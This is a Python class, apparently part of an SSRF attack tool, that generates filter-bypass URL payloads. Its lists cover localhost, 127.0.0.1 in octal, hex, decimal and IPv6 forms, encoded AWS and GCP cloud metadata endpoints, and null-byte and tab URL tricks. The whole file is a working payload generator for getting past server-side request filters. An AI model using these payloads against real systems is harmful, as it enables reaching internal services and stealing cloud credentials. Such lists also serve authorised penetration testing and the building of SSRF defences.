"""
Filter Bypass Engine - IP encoding, case variation, URL confusion
"""


class BypassEngine:
    def __init__(self, config):
        self.config = config

    def generate(self, bypass_target):
        payloads = []
        t = bypass_target.lower()

        if 'localhost' in t or 'all' in t:
            payloads.extend(self._bypass_localhost())

        if 'metadata' in t or 'all' in t:
            payloads.extend(self._bypass_metadata())

        if '127' in t or 'all' in t:
            payloads.extend(self._bypass_127())

        return payloads

    def _bypass_localhost(self):
        return [
            'http://localhost/',
            'http://LOCALHOST/',
            'http://LocalHost/',
            'http://localtest.me/',
            'http://lvh.me/',
            'http://127.0.0.1.xip.io/',
            'http://localhost.localdomain/',
            'http://[::1]/',
            'http://0/',
            'http://0.0.0.0/',
            'http://000/',
        ]

    def _bypass_metadata(self):
        return [
            # AWS
            'http://169.254.169.254/',
            'http://169.254.169.254.xip.io/',
            'http://[::ffff:a9fe:a9fe]/',
            'http://0251.0376.0251.0376/',    # Octal
            'http://0xa9.0xfe.0xa9.0xfe/',    # Hex
            'http://2852039166/',              # Decimal
            'http://169.254.169.254/',
            # GCP
            'http://metadata.google.internal/',
            'http://METADATA.GOOGLE.INTERNAL/',
        ]

    def _bypass_127(self):
        return [
            'http://127.0.0.1/',
            'http://127.1/',
            'http://127.0.1/',
            'http://0x7f000001/',
            'http://0177.0000.0000.0001/',
            'http://2130706433/',
            'http://[::ffff:127.0.0.1]/',
            'http://[0:0:0:0:0:ffff:127.0.0.1]/',
            'http://127.0.0.1%09/',
            'http://127.0.0.1%2509/',
            'http://127.0.0.1%00/',
        ]
